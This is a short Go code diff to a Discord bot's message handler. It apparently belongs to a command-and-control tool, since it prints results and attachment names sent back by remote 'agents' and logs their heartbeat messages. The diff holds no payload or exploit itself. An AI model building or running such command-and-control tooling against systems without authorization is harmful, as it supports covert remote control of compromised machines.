@@ -62,6 +62,18 @@ func messageCreateor(s *discordgo.Session, m *discordgo.MessageCreate){
 
 	} else if messageJSON.MessageType == message.MESSAGE_OUTPUT {
 		color.Blue("\n[!] Result from " + messageJSON.AgentID)
-		color.Blue(messageJSON.Message )
+		color.Blue(messageJSON.Message)
+
+		// fmt.Println("\nNumber of attachments")
+		// fmt.Println(len(m.Attachments))
+
+		// TODO: This doesn't work :()
+		if messageJSON.HasAttachment {
+			for _, file := range m.Attachments {
+				fmt.Println(file.Filename)
+			}
+		}
+	} else if messageJSON.MessageType == message.MESSAGE_PONG {
+		color.Green("\n[!] Agent " + messageJSON.AgentID + " is still up\n")
 	}
 }
